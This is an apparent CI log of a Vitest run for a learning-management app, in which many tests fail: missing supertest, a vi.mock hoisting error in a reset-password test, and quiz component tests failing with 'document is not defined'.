2025-11-18T17:36:10.9925873Z     [90m   | [39m     [31m^[39m
2025-11-18T17:36:10.9926681Z     [90m 31| [39m  test.describe.configure({ mode: 'serial' }); // Run tests in order
2025-11-18T17:36:10.9948646Z     [90m 32| [39m
2025-11-18T17:36:10.9948856Z 
2025-11-18T17:36:10.9949263Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[20/545]⎯[22m[39m
2025-11-18T17:36:10.9949595Z 
2025-11-18T17:36:10.9950625Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/admin/networks-schools.test.ts [2m[ __tests__/api/admin/networks-schools.test.ts ][22m
2025-11-18T17:36:10.9952461Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/admin/networks-supervisors.test.ts [2m[ __tests__/api/admin/networks-supervisors.test.ts ][22m
2025-11-18T17:36:10.9954073Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/admin/networks.test.ts [2m[ __tests__/api/admin/networks.test.ts ][22m
2025-11-18T17:36:10.9956046Z [31m[1mError[22m: Failed to load url supertest (resolved id: supertest) in /home/runner/work/fne-lms/fne-lms/__tests__/api/admin/networks.test.ts. Does the file exist?[39m
2025-11-18T17:36:10.9958178Z [90m [2m❯[22m loadAndTransform node_modules/vite/dist/node/chunks/dep-827b23df.js:[2m55077:21[22m[39m
2025-11-18T17:36:10.9958887Z 
2025-11-18T17:36:10.9959337Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[21/545]⎯[22m[39m
2025-11-18T17:36:10.9959686Z 
2025-11-18T17:36:10.9960880Z [31m[1m[7m FAIL [27m[22m[39m __tests__/pages/api/admin/reset-password.test.ts [2m[ __tests__/pages/api/admin/reset-password.test.ts ][22m
2025-11-18T17:36:10.9964021Z [31m[1mError[22m: [vitest] There was an error when mocking a module. If you are using "vi.mock" factory, make sure there are no top level variables inside, since this call is hoisted to top of the file. Read more: https://vitest.dev/api/vi.html#vi-mock[39m
2025-11-18T17:36:10.9965842Z [36m [2m❯[22m lib/api-auth.ts:[2m2:31[22m[39m
2025-11-18T17:36:10.9966658Z     [90m  1| [39mimport { NextApiRequest, NextApiResponse } from 'next';
2025-11-18T17:36:10.9988153Z     [90m  2| [39mimport { createServerSupabaseClient } from '@supabase/auth-helpers-nex…
2025-11-18T17:36:10.9989040Z     [90m   | [39m                              [31m^[39m
2025-11-18T17:36:10.9989947Z     [90m  3| [39mimport { createClient, SupabaseClient } from '@supabase/supabase-js';
2025-11-18T17:36:10.9990659Z     [90m  4| [39mimport { 
2025-11-18T17:36:10.9990898Z 
2025-11-18T17:36:10.9991713Z [31m[1mCaused by: ReferenceError[22m: Cannot access 'mockCreateClient' before initialization[39m
2025-11-18T17:36:10.9993004Z [36m [2m❯[22m __tests__/pages/api/admin/reset-password.test.ts:[2m3:17[22m[39m
2025-11-18T17:36:10.9993989Z [90m [2m❯[22m lib/api-auth.ts:[2m2:31[22m[39m
2025-11-18T17:36:10.9994351Z 
2025-11-18T17:36:10.9994773Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[22/545]⎯[22m[39m
2025-11-18T17:36:10.9995116Z 
2025-11-18T17:36:10.9995611Z [31m⎯⎯⎯⎯⎯⎯[1m[7m Failed Tests 424 [27m[22m⎯⎯⎯⎯⎯⎯[39m
2025-11-18T17:36:10.9995987Z 
2025-11-18T17:36:11.0000908Z [31m[1m[7m FAIL [27m[22m[39m __tests__/LearningQuizTaker.test.tsx[2m > [22mLearningQuizTaker[2m > [22mInitial Rendering[2m > [22mshould render quiz title and first question
2025-11-18T17:36:11.0002486Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.0003669Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.0004777Z [36m [2m❯[22m __tests__/LearningQuizTaker.test.tsx:[2m74:7[22m[39m
2025-11-18T17:36:11.0005550Z     [90m 72| [39m  describe('Initial Rendering', () => {
2025-11-18T17:36:11.0006359Z     [90m 73| [39m    it('should render quiz title and first question', () => {
2025-11-18T17:36:11.0007425Z     [90m 74| [39m      render(<LearningQuizTaker {...defaultProps} />);
2025-11-18T17:36:11.0008108Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.0008587Z     [90m 75| [39m      
2025-11-18T17:36:11.0010118Z     [90m 76| [39m      expect(screen.getByText('Test Quiz')).toBeInTheDocument();
2025-11-18T17:36:11.0010610Z 
2025-11-18T17:36:11.0011034Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[23/545]⎯[22m[39m
2025-11-18T17:36:11.0011435Z 
2025-11-18T17:36:11.0012896Z [31m[1m[7m FAIL [27m[22m[39m __tests__/LearningQuizTaker.test.tsx[2m > [22mLearningQuizTaker[2m > [22mInitial Rendering[2m > [22mshould not show any scores or points to students
2025-11-18T17:36:11.0014694Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.0015878Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.0017215Z [36m [2m❯[22m __tests__/LearningQuizTaker.test.tsx:[2m82:7[22m[39m
2025-11-18T17:36:11.0017823Z     [90m 80| [39m
2025-11-18T17:36:11.0018541Z     [90m 81| [39m    it('should not show any scores or points to students', () => {
2025-11-18T17:36:11.0019490Z     [90m 82| [39m      render(<LearningQuizTaker {...defaultProps} />);
2025-11-18T17:36:11.0020158Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.0020644Z     [90m 83| [39m      
2025-11-18T17:36:11.0021235Z     [90m 84| [39m      // Should not show points
2025-11-18T17:36:11.0021589Z 
2025-11-18T17:36:11.0022016Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[24/545]⎯[22m[39m
2025-11-18T17:36:11.0022348Z 
2025-11-18T17:36:11.0023697Z [31m[1m[7m FAIL [27m[22m[39m __tests__/LearningQuizTaker.test.tsx[2m > [22mLearningQuizTaker[2m > [22mInitial Rendering[2m > [22mshould render multiple choice options
2025-11-18T17:36:11.0025154Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.0026512Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.0027907Z [36m [2m❯[22m __tests__/LearningQuizTaker.test.tsx:[2m91:7[22m[39m
2025-11-18T17:36:11.0028462Z     [90m 89| [39m
2025-11-18T17:36:11.0029041Z     [90m 90| [39m    it('should render multiple choice options', () => {
2025-11-18T17:36:11.0029822Z     [90m 91| [39m      render(<LearningQuizTaker {...defaultProps} />);
2025-11-18T17:36:11.0030435Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.0030875Z     [90m 92| [39m      
2025-11-18T17:36:11.0031602Z     [90m 93| [39m      expect(screen.getByText('Buenos Aires')).toBeInTheDocument();
2025-11-18T17:36:11.0032110Z 
2025-11-18T17:36:11.0032478Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[25/545]⎯[22m[39m
2025-11-18T17:36:11.0032839Z 
2025-11-18T17:36:11.0034047Z [31m[1m[7m FAIL [27m[22m[39m __tests__/LearningQuizTaker.test.tsx[2m > [22mLearningQuizTaker[2m > [22mNavigation[2m > [22mshould navigate between questions
2025-11-18T17:36:11.0035328Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.0036511Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.0037845Z [36m [2m❯[22m __tests__/LearningQuizTaker.test.tsx:[2m102:7[22m[39m
2025-11-18T17:36:11.0038583Z     [90m100| [39m  describe('Navigation', () => {
2025-11-18T17:36:11.0039337Z     [90m101| [39m    it('should navigate between questions', () => {
2025-11-18T17:36:11.0040231Z     [90m102| [39m      render(<LearningQuizTaker {...defaultProps} />);
2025-11-18T17:36:11.0040961Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.0041450Z     [90m103| [39m      
2025-11-18T17:36:11.0042003Z     [90m104| [39m      // Initially on question 1
2025-11-18T17:36:11.0042356Z 
2025-11-18T17:36:11.0042793Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[26/545]⎯[22m[39m
2025-11-18T17:36:11.0043152Z 
2025-11-18T17:36:11.0044598Z [31m[1m[7m FAIL [27m[22m[39m __tests__/LearningQuizTaker.test.tsx[2m > [22mLearningQuizTaker[2m > [22mNavigation[2m > [22mshould disable navigation buttons appropriately
2025-11-18T17:36:11.0046064Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.0047423Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.0048594Z [36m [2m❯[22m __tests__/LearningQuizTaker.test.tsx:[2m118:7[22m[39m
2025-11-18T17:36:11.0049289Z     [90m116| [39m
2025-11-18T17:36:11.0049993Z     [90m117| [39m    it('should disable navigation buttons appropriately', () => {
2025-11-18T17:36:11.0050892Z     [90m118| [39m      render(<LearningQuizTaker {...defaultProps} />);
2025-11-18T17:36:11.0051855Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.0052347Z     [90m119| [39m      
2025-11-18T17:36:11.0053055Z     [90m120| [39m      // Previous button should be disabled on first question
2025-11-18T17:36:11.0053522Z 
2025-11-18T17:36:11.0053963Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[27/545]⎯[22m[39m
2025-11-18T17:36:11.0054307Z 
2025-11-18T17:36:11.0055800Z [31m[1m[7m FAIL [27m[22m[39m __tests__/LearningQuizTaker.test.tsx[2m > [22mLearningQuizTaker[2m > [22mNavigation[2m > [22mshould allow direct navigation via question numbers
2025-11-18T17:36:11.0057423Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.0058586Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.0059737Z [36m [2m❯[22m __tests__/LearningQuizTaker.test.tsx:[2m133:7[22m[39m
2025-11-18T17:36:11.0060426Z     [90m131| [39m
2025-11-18T17:36:11.0061237Z     [90m132| [39m    it('should allow direct navigation via question numbers', () => {
2025-11-18T17:36:11.0062290Z     [90m133| [39m      render(<LearningQuizTaker {...defaultProps} />);
2025-11-18T17:36:11.0063014Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.0063497Z     [90m134| [39m      
2025-11-18T17:36:11.0064097Z     [90m135| [39m      // Click on question 3 button
2025-11-18T17:36:11.0064447Z 
2025-11-18T17:36:11.0065094Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[28/545]⎯[22m[39m
2025-11-18T17:36:11.0065454Z 
2025-11-18T17:36:11.0067648Z [31m[1m[7m FAIL [27m[22m[39m __tests__/LearningQuizTaker.test.tsx[2m > [22mLearningQuizTaker[2m > [22mAnswer Selection[2m > [22mshould allow selecting multiple choice answers
2025-11-18T17:36:11.0069227Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.0070380Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.0071642Z [36m [2m❯[22m __tests__/LearningQuizTaker.test.tsx:[2m145:7[22m[39m
2025-11-18T17:36:11.0072529Z     [90m143| [39m  describe('Answer Selection', () => {
2025-11-18T17:36:11.0073458Z     [90m144| [39m    it('should allow selecting multiple choice answers', () => {
2025-11-18T17:36:11.0074454Z     [90m145| [39m      render(<LearningQuizTaker {...defaultProps} />);
2025-11-18T17:36:11.0075180Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.0075684Z     [90m146| [39m      
2025-11-18T17:36:11.0076476Z     [90m147| [39m      const santiagoOption = screen.getByLabelText(/Santiago/);
2025-11-18T17:36:11.0077193Z 
2025-11-18T17:36:11.0077659Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[29/545]⎯[22m[39m
2025-11-18T17:36:11.0078008Z 
2025-11-18T17:36:11.0079545Z [31m[1m[7m FAIL [27m[22m[39m __tests__/LearningQuizTaker.test.tsx[2m > [22mLearningQuizTaker[2m > [22mAnswer Selection[2m > [22mshould allow entering text for open-ended questions
2025-11-18T17:36:11.0082288Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.0083431Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.0085297Z [36m [2m❯[22m __tests__/LearningQuizTaker.test.tsx:[2m155:7[22m[39m
2025-11-18T17:36:11.0085972Z     [90m153| [39m
2025-11-18T17:36:11.0086957Z     [90m154| [39m    it('should allow entering text for open-ended questions', () => {
2025-11-18T17:36:11.0087968Z     [90m155| [39m      render(<LearningQuizTaker {...defaultProps} />);
2025-11-18T17:36:11.0088625Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.0089058Z     [90m156| [39m      
2025-11-18T17:36:11.0089639Z     [90m157| [39m      // Navigate to open-ended question
2025-11-18T17:36:11.0089997Z 
2025-11-18T17:36:11.0090419Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[30/545]⎯[22m[39m
2025-11-18T17:36:11.0090753Z 
2025-11-18T17:36:11.0092277Z [31m[1m[7m FAIL [27m[22m[39m __tests__/LearningQuizTaker.test.tsx[2m > [22mLearningQuizTaker[2m > [22mAnswer Selection[2m > [22mshould show character count for open-ended questions
2025-11-18T17:36:11.0094121Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.0095204Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.0096302Z [36m [2m❯[22m __tests__/LearningQuizTaker.test.tsx:[2m167:7[22m[39m
2025-11-18T17:36:11.0097195Z     [90m165| [39m
2025-11-18T17:36:11.0098010Z     [90m166| [39m    it('should show character count for open-ended questions', () => {
2025-11-18T17:36:11.0099025Z     [90m167| [39m      render(<LearningQuizTaker {...defaultProps} />);
2025-11-18T17:36:11.0099755Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.0100235Z     [90m168| [39m      
2025-11-18T17:36:11.0100835Z     [90m169| [39m      // Navigate to open-ended question
2025-11-18T17:36:11.0101206Z 
2025-11-18T17:36:11.0101627Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[31/545]⎯[22m[39m
2025-11-18T17:36:11.0101967Z 
2025-11-18T17:36:11.0103832Z [31m[1m[7m FAIL [27m[22m[39m __tests__/LearningQuizTaker.test.tsx[2m > [22mLearningQuizTaker[2m > [22mTwo-Tier Feedback System[2m > [22mshould show tier 1 feedback on first incorrect attempt
2025-11-18T17:36:11.0105965Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.0107843Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.0110110Z [36m [2m❯[22m __tests__/LearningQuizTaker.test.tsx:[2m181:7[22m[39m
2025-11-18T17:36:11.0111354Z     [90m179| [39m  describe('Two-Tier Feedback System', () => {
2025-11-18T17:36:11.0112401Z     [90m180| [39m    it('should show tier 1 feedback on first incorrect attempt', async…
2025-11-18T17:36:11.0113407Z     [90m181| [39m      render(<LearningQuizTaker {...defaultProps} />);
2025-11-18T17:36:11.0114408Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.0115171Z     [90m182| [39m      
2025-11-18T17:36:11.0116062Z     [90m183| [39m      // Answer first question incorrectly
2025-11-18T17:36:11.0117023Z 
2025-11-18T17:36:11.0117490Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[32/545]⎯[22m[39m
2025-11-18T17:36:11.0117834Z 
2025-11-18T17:36:11.0119424Z [31m[1m[7m FAIL [27m[22m[39m __tests__/LearningQuizTaker.test.tsx[2m > [22mLearningQuizTaker[2m > [22mTwo-Tier Feedback System[2m > [22mshould show tier 2 feedback on second incorrect attempt
2025-11-18T17:36:11.0121036Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.0122118Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.0123251Z [36m [2m❯[22m __tests__/LearningQuizTaker.test.tsx:[2m206:7[22m[39m
2025-11-18T17:36:11.0123928Z     [90m204| [39m
2025-11-18T17:36:11.0124701Z     [90m205| [39m    it('should show tier 2 feedback on second incorrect attempt', asyn…
2025-11-18T17:36:11.0125719Z     [90m206| [39m      render(<LearningQuizTaker {...defaultProps} />);
2025-11-18T17:36:11.0126473Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.0127152Z     [90m207| [39m      
2025-11-18T17:36:11.0127720Z     [90m208| [39m      // First attempt with wrong answer
2025-11-18T17:36:11.0128077Z 
2025-11-18T17:36:11.0128452Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[33/545]⎯[22m[39m
2025-11-18T17:36:11.0128789Z 
2025-11-18T17:36:11.0130357Z [31m[1m[7m FAIL [27m[22m[39m __tests__/LearningQuizTaker.test.tsx[2m > [22mLearningQuizTaker[2m > [22mTwo-Tier Feedback System[2m > [22mshould highlight incorrect questions in tier 2
2025-11-18T17:36:11.0131947Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.0133126Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.0134227Z [36m [2m❯[22m __tests__/LearningQuizTaker.test.tsx:[2m234:7[22m[39m
2025-11-18T17:36:11.0134885Z     [90m232| [39m
2025-11-18T17:36:11.0135689Z     [90m233| [39m    it('should highlight incorrect questions in tier 2', async () => {
2025-11-18T17:36:11.0137204Z     [90m234| [39m      render(<LearningQuizTaker {...defaultProps} />);
2025-11-18T17:36:11.0137929Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.0138412Z     [90m235| [39m      
2025-11-18T17:36:11.0139625Z     [90m236| [39m      // Setup for tier 2 (two attempts with wrong answer)
2025-11-18T17:36:11.0140266Z 
2025-11-18T17:36:11.0140686Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[34/545]⎯[22m[39m
2025-11-18T17:36:11.0141007Z 
2025-11-18T17:36:11.0142595Z [31m[1m[7m FAIL [27m[22m[39m __tests__/LearningQuizTaker.test.tsx[2m > [22mLearningQuizTaker[2m > [22mQuiz Submission[2m > [22mshould require all questions to be answered
2025-11-18T17:36:11.0144068Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.0145156Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.0146277Z [36m [2m❯[22m __tests__/LearningQuizTaker.test.tsx:[2m266:7[22m[39m
2025-11-18T17:36:11.0147322Z     [90m264| [39m  describe('Quiz Submission', () => {
2025-11-18T17:36:11.0148236Z     [90m265| [39m    it('should require all questions to be answered', async () => {
2025-11-18T17:36:11.0149187Z     [90m266| [39m      render(<LearningQuizTaker {...defaultProps} />);
2025-11-18T17:36:11.0149886Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.0150365Z     [90m267| [39m      
2025-11-18T17:36:11.0150981Z     [90m268| [39m      // Try to submit without answering
2025-11-18T17:36:11.0151347Z 
2025-11-18T17:36:11.0151751Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[35/545]⎯[22m[39m
2025-11-18T17:36:11.0152075Z 
2025-11-18T17:36:11.0153517Z [31m[1m[7m FAIL [27m[22m[39m __tests__/LearningQuizTaker.test.tsx[2m > [22mLearningQuizTaker[2m > [22mQuiz Submission[2m > [22mshould submit quiz when all answers are correct
2025-11-18T17:36:11.0154991Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.0156132Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.0157521Z [36m [2m❯[22m __tests__/LearningQuizTaker.test.tsx:[2m292:7[22m[39m
2025-11-18T17:36:11.0158254Z     [90m290| [39m      });
2025-11-18T17:36:11.0158676Z     [90m291| [39m      
2025-11-18T17:36:11.0159334Z     [90m292| [39m      render(<LearningQuizTaker {...defaultProps} />);
2025-11-18T17:36:11.0159991Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.0160451Z     [90m293| [39m      
2025-11-18T17:36:11.0161076Z     [90m294| [39m      // Answer all questions correctly
2025-11-18T17:36:11.0161446Z 
2025-11-18T17:36:11.0161876Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[36/545]⎯[22m[39m
2025-11-18T17:36:11.0162204Z 
2025-11-18T17:36:11.0163650Z [31m[1m[7m FAIL [27m[22m[39m __tests__/LearningQuizTaker.test.tsx[2m > [22mLearningQuizTaker[2m > [22mQuiz Submission[2m > [22mshould show completion screen without scores
2025-11-18T17:36:11.0165130Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.0166228Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.0167901Z [36m [2m❯[22m __tests__/LearningQuizTaker.test.tsx:[2m335:7[22m[39m
2025-11-18T17:36:11.0170013Z     [90m333| [39m      });
2025-11-18T17:36:11.0170465Z     [90m334| [39m      
2025-11-18T17:36:11.0171126Z     [90m335| [39m      render(<LearningQuizTaker {...defaultProps} />);
2025-11-18T17:36:11.0172516Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.0173072Z     [90m336| [39m      
2025-11-18T17:36:11.0173598Z     [90m337| [39m      // Answer questions
2025-11-18T17:36:11.0173905Z 
2025-11-18T17:36:11.0174322Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[37/545]⎯[22m[39m
2025-11-18T17:36:11.0174672Z 
2025-11-18T17:36:11.0176131Z [31m[1m[7m FAIL [27m[22m[39m __tests__/LearningQuizTaker.test.tsx[2m > [22mLearningQuizTaker[2m > [22mQuiz Submission[2m > [22mshould handle submission errors gracefully
2025-11-18T17:36:11.0177792Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.0178967Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.0180114Z [36m [2m❯[22m __tests__/LearningQuizTaker.test.tsx:[2m357:7[22m[39m
2025-11-18T17:36:11.0181183Z     [90m355| [39m      (submitQuiz as any).mockRejectedValueOnce(new Error('Network err…
2025-11-18T17:36:11.0181905Z     [90m356| [39m      
2025-11-18T17:36:11.0182829Z     [90m357| [39m      render(<LearningQuizTaker {...defaultProps} />);
2025-11-18T17:36:11.0183572Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.0184090Z     [90m358| [39m      
2025-11-18T17:36:11.0184643Z     [90m359| [39m      // Answer all questions
2025-11-18T17:36:11.0184986Z 
2025-11-18T17:36:11.0185408Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[38/545]⎯[22m[39m
2025-11-18T17:36:11.0185721Z 
2025-11-18T17:36:11.0187366Z [31m[1m[7m FAIL [27m[22m[39m __tests__/LearningQuizTaker.test.tsx[2m > [22mLearningQuizTaker[2m > [22mQuestion Randomization[2m > [22mshould randomize questions when enabled
2025-11-18T17:36:11.0188842Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.0189977Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.0191109Z [36m [2m❯[22m __tests__/LearningQuizTaker.test.tsx:[2m386:28[22m[39m
2025-11-18T17:36:11.0191768Z     [90m384| [39m      
2025-11-18T17:36:11.0192481Z     [90m385| [39m      // Render multiple times to check randomization
2025-11-18T17:36:11.0193260Z     [90m386| [39m      const { rerender } = render(
2025-11-18T17:36:11.0193970Z     [90m   | [39m                           [31m^[39m
2025-11-18T17:36:11.0194804Z     [90m387| [39m        <LearningQuizTaker {...defaultProps} quiz={randomQuiz} />
2025-11-18T17:36:11.0195500Z     [90m388| [39m      );
2025-11-18T17:36:11.0195761Z 
2025-11-18T17:36:11.0196168Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[39/545]⎯[22m[39m
2025-11-18T17:36:11.0196490Z 
2025-11-18T17:36:11.0198205Z [31m[1m[7m FAIL [27m[22m[39m __tests__/LearningQuizTaker.test.tsx[2m > [22mLearningQuizTaker[2m > [22mQuestion Randomization[2m > [22mshould randomize answer options when enabled
2025-11-18T17:36:11.0199794Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.0200973Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.0202114Z [36m [2m❯[22m __tests__/LearningQuizTaker.test.tsx:[2m404:7[22m[39m
2025-11-18T17:36:11.0202771Z     [90m402| [39m      };
2025-11-18T17:36:11.0203227Z     [90m403| [39m      
2025-11-18T17:36:11.0204079Z     [90m404| [39m      render(<LearningQuizTaker {...defaultProps} quiz={randomQuiz} />…
2025-11-18T17:36:11.0204856Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.0205364Z     [90m405| [39m      
2025-11-18T17:36:11.0206115Z     [90m406| [39m      // Check that all options are present (order may vary)
2025-11-18T17:36:11.0206552Z 
2025-11-18T17:36:11.0207158Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[40/545]⎯[22m[39m
2025-11-18T17:36:11.0207774Z 
2025-11-18T17:36:11.0209126Z [31m[1m[7m FAIL [27m[22m[39m __tests__/LearningQuizTaker.test.tsx[2m > [22mLearningQuizTaker[2m > [22mTimer Display[2m > [22mshould display elapsed time
2025-11-18T17:36:11.0210497Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.0211760Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.0212905Z [36m [2m❯[22m __tests__/LearningQuizTaker.test.tsx:[2m416:7[22m[39m
2025-11-18T17:36:11.0213673Z     [90m414| [39m  describe('Timer Display', () => {
2025-11-18T17:36:11.0214486Z     [90m415| [39m    it('should display elapsed time', async () => {
2025-11-18T17:36:11.0215357Z     [90m416| [39m      render(<LearningQuizTaker {...defaultProps} />);
2025-11-18T17:36:11.0216058Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.0216558Z     [90m417| [39m      
2025-11-18T17:36:11.0217371Z     [90m418| [39m      // Initially shows 0:00
2025-11-18T17:36:11.0217714Z 
2025-11-18T17:36:11.0218114Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[41/545]⎯[22m[39m
2025-11-18T17:36:11.0218424Z 
2025-11-18T17:36:11.0220658Z [31m[1m[7m FAIL [27m[22m[39m __tests__/StudentBlockRenderer.quiz.test.tsx[2m > [22mStudentBlockRenderer - Quiz Block[2m > [22mQuiz Rendering with Required Props[2m > [22mshould render LearningQuizTaker when all required props are provided
2025-11-18T17:36:11.0222602Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.0223777Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.0225049Z [36m [2m❯[22m __tests__/StudentBlockRenderer.quiz.test.tsx:[2m63:7[22m[39m
2025-11-18T17:36:11.0226081Z     [90m 61| [39m  describe('Quiz Rendering with Required Props', () => {
2025-11-18T17:36:11.0227368Z     [90m 62| [39m    it('should render LearningQuizTaker when all required props are pr…
2025-11-18T17:36:11.0228172Z     [90m 63| [39m      render(
2025-11-18T17:36:11.0228676Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.0229252Z     [90m 64| [39m        <StudentBlockRenderer
2025-11-18T17:36:11.0229858Z     [90m 65| [39m          block={quizBlock}
2025-11-18T17:36:11.0230159Z 
